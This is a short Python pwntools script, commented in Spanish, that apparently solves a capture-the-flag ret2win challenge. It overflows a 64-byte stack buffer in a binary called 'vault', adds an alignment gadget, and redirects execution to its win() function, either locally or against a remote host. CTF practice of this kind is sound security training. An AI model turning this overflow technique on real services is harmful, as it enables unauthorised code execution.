#!/usr/bin/env python3
"""
Solución: easy-pwn-ret2win
Técnica: Stack Buffer Overflow → ret2win

Offset: 72 bytes (64 buffer + 8 saved rbp)
win() address: fija porque PIE=off
"""

import sys
from pwn import *

BINARY = './vault'
elf = ELF(BINARY, checksec=False)

WIN = elf.symbols['win']
print(f"[*] win() @ {hex(WIN)}")

if args.REMOTE:
    host, port = sys.argv[2], int(sys.argv[3])
    p = remote(host, port)
else:
    p = process(BINARY)

OFFSET = 72   # 64-byte buffer + 8-byte saved rbp

# x86-64: el ret antes de win() sirve como stack aligner (RSP % 16 == 0)
# si win() llama a puts/fopen puede necesitar RSP alineado a 16 bytes.
RET = elf.address + 0x101a   # 'ret' gadget en el prólogo, ajustar si falla

payload  = b'A' * OFFSET
payload += p64(RET)           # alineador de stack (quitar si no es necesario)
payload += p64(WIN)

p.recvuntil(b'access code: ')
p.send(payload)
p.interactive()
